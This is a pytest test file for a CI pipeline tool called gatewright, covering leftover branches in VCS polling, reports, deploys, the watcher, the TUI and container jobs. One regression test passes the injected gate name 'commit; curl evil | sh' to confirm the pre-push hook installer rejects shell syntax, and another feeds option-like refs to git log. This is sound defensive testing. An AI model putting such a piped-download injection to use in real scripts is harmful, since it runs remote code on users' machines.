# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
"""The last partial branches: the 'other side' of conditions the scenario tests always take one way."""

import asyncio
import json
import os
import sys
from pathlib import Path

import pytest

from gatewright import cli, reports, runner
from gatewright.config import load_pipeline
from gatewright.engine import Engine, Selection
from gatewright.models import GateResult, JobError, JobResult, RunResult
from gatewright.secrets import SecretStore
from gatewright.vcs import VCSConfig, VCSEvent, make_provider

from .conftest import BASIC_PIPELINE

from .conftest import PY  # noqa: E402
SHA = "e" * 40


class FakeHttp:
    def __init__(self, pages):
        self.pages = pages

    def request(self, method, url, body=None, etag=None, params=None):
        return 200, self.pages.get(url, []), {}


@pytest.mark.parametrize("kind, api", [("github", "https://api.github.com"), ("gitea", "https://g/api/v1"),
                                       ("gitlab", "https://gl/api/v4")])
def test_list_events_without_prs_and_unwatched_branches(kind, api):
    p = make_provider(VCSConfig(kind, "acme/app", api_url=api, pull_requests=False), "t")
    branches = [{"name": "main", "commit": {"id": SHA, "sha": SHA}}, {"name": "wip", "commit": {"id": SHA, "sha": SHA}}]
    p.http = FakeHttp({u: branches for u in (f"{api}/repos/acme/app/branches",
                                             f"{getattr(p, 'project', '')}/repository/branches")})
    assert [e.ref for e in p.list_events({})] == ["main"]


def test_release_note_type_not_in_any_section():
    from gatewright.releasenotes import classify
    assert classify({"subject": "wip: try something", "body": ""})[0] == "Other changes"


def test_plain_render_and_reports_without_md(tmp_path, monkeypatch):
    from gatewright import render
    monkeypatch.setattr(render, "PLAIN", True)
    (tmp_path / "a.py").write_text("x = 1\n")
    e = JobError("j", "lint", "low", "x", file="a.py", line=1, snippet=[(1, "x = 1")])
    assert render.error_panel(e)
    run = RunResult(run_id="r", pipeline="p", root=str(tmp_path), started="")
    g = GateResult(gate="g", mode="enforced")
    j = JobResult("j", "g", "dev", "failed")
    j.errors = [JobError("j", "lint", "low", "no line", file="a.py")]
    g.jobs, run.gates = [j], [g]
    files, _ = reports.write_reports(run, tmp_path / "o", ["sarif"])
    sarif = json.loads(Path(files[0]).read_text(encoding="utf-8"))
    assert "region" not in sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"]


def test_project_venv_without_bin_folder(tmp_path):
    (tmp_path / ".venv").mkdir()
    (tmp_path / ".venv" / "pyvenv.cfg").write_text("")
    assert runner.project_venv(str(tmp_path)) is None


def test_mask_leaves_files_without_secrets(tmp_path, monkeypatch):
    monkeypatch.setenv("GATEWRIGHT_SECRET_K", "longsecret")
    s = SecretStore(str(tmp_path))
    s.get("K")
    (tmp_path / "plain.txt").write_text("nothing here")
    assert runner.mask_output_files(str(tmp_path), s) == 0


def test_init_keeps_a_complete_gitignore(tmp_path):
    from gatewright.templates import GITIGNORE, init
    (tmp_path / ".gitignore").write_text("\n".join(GITIGNORE) + "\n")
    _, written = init(tmp_path, "python")
    assert ".gitignore" not in written


def test_smtp_ssl_without_login(tmp_path, monkeypatch):
    import smtplib
    from gatewright.notify import Notifier
    sent = []

    class SSL:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def login(self, *a):
            raise AssertionError("no login without credentials")

        def send_message(self, m):
            sent.append(m)
    monkeypatch.setattr(smtplib, "SMTP_SSL", SSL)
    n = Notifier({"channels": [{"type": "email", "smtp": "m:465", "from": "a@x", "to": ["b@x"], "on": ["run_failed"]}]},
                 SecretStore(str(tmp_path)))
    n.send("run_failed", "t", "x")
    assert sent and not n.warnings


def test_errors_relative_file_uri_frames_outside_and_sarif_without_severity(tmp_path):
    from gatewright.errors import _first_location, parse_output, relpath
    from gatewright.models import Job
    assert relpath("file://src/a.py", str(tmp_path)) == "src/a.py"
    (tmp_path / "a.py").write_text("x\n")
    tb = 'File "/usr/lib/python3/x.py", line 3\nFile "a.py", line 1\nFile "/elsewhere/y.py", line 9\n'
    assert _first_location(tb, str(tmp_path)) == ("a.py", 1)
    sarif = {"runs": [{"tool": {"driver": {"name": "t", "rules": [{"id": "R", "properties": {"tags": ["x"]}}]}},
                       "results": [{"ruleId": "R", "level": "warning", "message": {"text": "m"}}]}]}
    errs, _, _ = parse_output(Job(id="j", gate="g", run="t", parser={"type": "sarif"}), json.dumps(sarif), "", 1,
                              str(tmp_path), None)
    assert errs[0].severity == "medium"


def test_doctor_vcs_without_webhook(project):
    from gatewright import doctor
    root = project(BASIC_PIPELINE + "vcs: {provider: github, repo: a/b}\n", "jobs: []\n")
    names = [c.name for c in doctor.run_doctor(load_pipeline(root))]
    assert "vcs token (VCS_TOKEN)" in names and not any(n.startswith("webhook") for n in names)


def test_cli_failed_job_with_only_suppressed_errors(capsys):
    r = JobResult("j", "g", "dev", "failed")
    e = JobError("j", "lint", "low", "x")
    e.suppressed = True
    r.errors = [e]
    cli._Progress(False)("job_end", {"result": r})
    assert "→" not in capsys.readouterr().out


def test_keygen_without_add(tmp_path, capsys):
    import shutil
    if not shutil.which("ssh-keygen"):
        pytest.skip("needs ssh-keygen")
    assert cli.main(["-C", str(tmp_path), "keygen", "--identity", "me@x", "--key", str(tmp_path / "k")]) == 0
    assert "Added to" not in capsys.readouterr().out and not (tmp_path / ".gatewright").exists()


# ---------------------------------------------------------------- deploy: signed, auto-rollback notify, no notifier
def _signed(project, tmp_path, env_yaml):
    import shutil
    if not shutil.which("ssh-keygen"):
        pytest.skip("needs ssh-keygen")
    from gatewright import signing
    key = tmp_path / "keys" / "k"
    line = signing.keygen(key, "me@x")
    root = project(BASIC_PIPELINE + f"signing:\n  key: {key}\n  identity: me@x\n" + env_yaml,
                   f"jobs:\n  - {{id: a, gate: commit, run: '{PY} -c \"1\"', cache: false}}\n", git=True)
    (root / ".gatewright" / "allowed_signers").write_text(line + "\n")
    return root


def test_signed_promote_and_auto_rollback_notifies(project, tmp_path):
    from gatewright.deploy import Deployer
    root = _signed(project, tmp_path, "environments:\n  staging:\n    deploy: 'exit 0'\n"
                   f"    verify: '{PY} health.py'\n    auto_rollback: true\n    require_signature: true\n")
    (root / "health.py").write_text("import os, sys\nsys.exit(1 if os.path.exists('UNHEALTHY') else 0)\n")
    told = []
    notifier = type("N", (), {"deployment": lambda self, kind, env, run, text: told.append(kind)})()
    d = Deployer(load_pipeline(root), notifier=notifier, confirm=lambda q: True)
    good = Engine(load_pipeline(root)).run(Selection(reports=["md"]))
    assert d.promote(good.run_id, "staging", yes=True).status == "succeeded"
    newer = Engine(load_pipeline(root)).run(Selection(reports=["md"]))
    (root / "UNHEALTHY").write_text("")
    dep = d.promote(newer.run_id, "staging", yes=True)
    assert dep.status == "rolled_back" and "rolled_back" in told


def test_verify_failure_without_notifier(project):
    from gatewright.deploy import Deployer
    root = project(BASIC_PIPELINE + "environments:\n  staging:\n    deploy: 'exit 0'\n    verify: 'exit 1'\n",
                   f"jobs:\n  - {{id: a, gate: commit, run: '{PY} -c \"1\"', cache: false}}\n", git=True)
    run = Engine(load_pipeline(root)).run(Selection(reports=["md"]))
    assert Deployer(load_pipeline(root), confirm=lambda q: True).promote(run.run_id, "staging", True).status == \
        "verify_failed"


# ---------------------------------------------------------------- watcher
def _watch_home(tmp_path, clone_url=""):
    (tmp_path / ".gatewright").mkdir(exist_ok=True)
    (tmp_path / ".gatewright" / "pipeline.yml").write_text(
        "version: 1\nname: a\ngates: [{id: commit}]\nvcs: {provider: github, repo: a/b}\n")
    from gatewright.watch import Watcher
    return Watcher(str(tmp_path), provider=make_provider(VCSConfig("github", "a/b", clone_url=clone_url), None))


def test_run_approved_when_already_stopped_and_loop_poll_timing(tmp_path, monkeypatch):
    w = _watch_home(tmp_path)
    w.stop.set()
    assert w.run_approved() == []
    w.stop.clear()
    polls = []
    monkeypatch.setattr(w, "poll_once", lambda: polls.append(1) or [])
    calls = {"n": 0}

    def wait(t):
        calls["n"] += 1
        if calls["n"] >= 2:
            w.stop.set()
    monkeypatch.setattr(w.stop, "wait", wait)
    w.loop()
    assert polls == [1]                          # second pass: poll not due yet


def test_pr_comment_for_trusted_item():
    from gatewright.watch import pr_comment
    run = RunResult(run_id="r", pipeline="p", root="/x", started="")
    run.status = "passed"
    item = type("I", (), {"sha": SHA, "trusted": True})()
    assert "Untrusted" not in pr_comment(run, item, "https://ci/r")


def test_checkout_without_token_uses_no_auth_header(tmp_path):
    """Public repos: no token -> git gets no Authorization header at all."""
    from .fakehost import git
    work = tmp_path / "work"
    work.mkdir()
    git(work, "init", "-q", "-b", "main")
    (work / "f").write_text("x")
    git(work, "add", "-A")
    git(work, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "x")
    sha = git(work, "rev-parse", "HEAD")
    bare = tmp_path / "o.git"
    git(tmp_path, "clone", "-q", "--bare", str(work), str(bare))
    home = tmp_path / "home"
    home.mkdir()
    w = _watch_home(home, str(bare))
    from gatewright.queue import Queue
    item, _ = Queue(str(home)).add(VCSEvent("push", sha, "main"), True, True)
    assert (w.checkout(item) / "f").exists()


# ---------------------------------------------------------------- TUI leftovers
def test_tui_remaining_paths(project, monkeypatch):
    from gatewright.tui import GatewrightApp
    root = project(BASIC_PIPELINE, f"jobs:\n  - {{id: a, gate: commit, run: '{PY} -c \"1\"'}}\n")

    async def scenario():
        app = GatewrightApp(load_pipeline(root))
        async with app.run_test(size=(150, 46)) as pilot:
            await pilot.pause(0.2)
            app.results["ghost"] = JobResult("ghost", "commit", "dev", "passed")
            app._show_errors("ghost")                         # a result whose job left the pipeline
            app.query_one("#jobs").clear()
            app._select_first_failed()                        # empty table: nothing to select
            from textual.widgets import DataTable
            app._job_highlighted(DataTable.RowHighlighted(app.query_one("#jobs"), 0, None))
            app._history_selected(type("E", (), {"row_key": type("K", (), {"value": "no-such-run"})()})())
            real = app.engine.plan
            monkeypatch.setattr(app.engine, "plan", lambda sel: (_ for _ in ()).throw(ValueError("bad gate")))
            app.action_dry_run()
            def with_warning(sel):
                p = real(sel)
                p.warnings.append("heads up")
                return p
            monkeypatch.setattr(app.engine, "plan", with_warning)
            app.action_dry_run()
            await pilot.pause(0.1)
    asyncio.run(scenario())


def test_pdf_rendering_failure_and_success_are_reported(tmp_path, monkeypatch):
    import types
    fake = types.ModuleType("weasyprint")

    class BrokenHTML:
        def __init__(self, string):
            pass

        def write_pdf(self, path):
            raise RuntimeError("no usable fonts")
    fake.HTML = BrokenHTML
    monkeypatch.setitem(sys.modules, "weasyprint", fake)
    assert reports.write_pdf("<p>x</p>", tmp_path / "r.pdf") == "PDF rendering failed: no usable fonts"

    class GoodHTML(BrokenHTML):
        def write_pdf(self, path):
            Path(path).write_bytes(b"%PDF-1.7")
    fake.HTML = GoodHTML
    assert reports.write_pdf("<p>x</p>", tmp_path / "r.pdf") is None and (tmp_path / "r.pdf").exists()


def test_hook_rejects_shell_syntax_and_unknown_gates(project, capsys):
    """Regression: gate names were written unchecked into the pre-push shell script."""
    from gatewright import hooks
    root = project(BASIC_PIPELINE, "jobs: []\n", git=True)
    with pytest.raises(ValueError, match="Invalid gate name"):
        hooks.install(str(root), ["commit; curl evil | sh"])
    with pytest.raises(ValueError):
        hooks.install(str(root), [])
    assert cli.main(["-C", str(root), "hook", "install", "-g", "comit"]) == 2
    assert "Unknown gate(s) comit" in capsys.readouterr().err
    (root / ".gatewright" / "pipeline.yml").write_text("gates: broken\n")
    assert cli.main(["-C", str(root), "hook", "install", "-g", "commit"]) == 0   # broken config: still installs


def test_release_notes_refuse_option_like_refs(project):
    """Regression: `--from --output=x` was passed to git log as an option."""
    from gatewright.releasenotes import generate
    root = project(BASIC_PIPELINE, "jobs: []\n", git=True)
    for bad in ("--output=/tmp/x", ""):
        with pytest.raises(ValueError, match="is not a git ref"):
            generate(str(root), bad, "HEAD")
    with pytest.raises(ValueError):
        generate(str(root), None, "-p")


def test_error_line_highlight_in_color_mode(tmp_path, monkeypatch):
    """Coverage must not depend on whether the test runner has a color terminal."""
    from gatewright import render
    monkeypatch.setattr(render, "PLAIN", False)
    e = JobError("j", "lint", "low", "x", file="a.py", line=2, snippet=[(1, "a = 1"), (2, "b = 2")])
    assert render.error_panel(e)


@pytest.mark.skipif(os.name == "nt", reason="the fake docker is a POSIX shell script")
def test_container_job_with_a_fake_docker(tmp_path, monkeypatch):
    """Container code paths without a Docker daemon: argv, no network, path mapping back to the project."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    fake = bindir / "docker"
    fake.write_text('#!/bin/sh\necho "$@" > "$FAKE_DOCKER_ARGS"\n'
                    'echo "/work/app.py:1: boom" >&2\nexit 1\n')
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_DOCKER_ARGS", str(tmp_path / "args.txt"))
    root = tmp_path / "proj"
    root.mkdir()
    (root / "app.py").write_text("x = 1\n")
    job = runner.Job(id="c", gate="g", run="python app.py", image="python:3.12", network=False)
    r = runner.execute(job, root=str(root), run_id="r", out_dir=str(root / "out"), log_file=str(tmp_path / "l"),
                       secrets=SecretStore(str(root)), handle=runner.JobHandle(job))
    args = (tmp_path / "args.txt").read_text(encoding="utf-8")
    assert "--network none" in args and "python:3.12" in args
    assert r.status == "failed" and r.errors[0].file == "app.py"     # /work/app.py mapped back to the project


def test_container_runs_as_root_when_gatewright_is_root(monkeypatch, tmp_path):
    monkeypatch.setattr(os, "getuid", lambda: 0, raising=False)
    argv, _ = runner._docker_argv(runner.Job(id="a", gate="g", run="x", image="i"), str(tmp_path), "r",
                                  str(tmp_path / "o"), [])
    assert "--user" not in argv


def test_tools_dir_outside_a_venv(monkeypatch, tmp_path):
    monkeypatch.setattr(sys, "base_prefix", sys.prefix)
    assert runner.gatewright_tools_dir() is None and runner._python_shims() is None
    exe, src = runner.python_for_jobs(str(tmp_path))
    assert src == "PATH"


def _fake_weasyprint(monkeypatch):
    import types
    fake = types.ModuleType("weasyprint")

    class HTML:
        def __init__(self, string):
            pass

        def write_pdf(self, path):
            Path(path).write_bytes(b"%PDF-1.7")
    fake.HTML = HTML
    monkeypatch.setitem(sys.modules, "weasyprint", fake)


def test_pdf_paths_do_not_depend_on_weasyprint_being_installed(tmp_path, monkeypatch):
    """Coverage must be 100% with or without WeasyPrint on the machine."""
    from gatewright import doctor
    _fake_weasyprint(monkeypatch)
    assert doctor.weasyprint_problem() is None
    run = RunResult(run_id="r", pipeline="p", root=str(tmp_path), started="")
    files, warns = reports.write_reports(run, tmp_path / "o", ["pdf"])
    assert warns == [] and any(f.endswith(".pdf") for f in files)
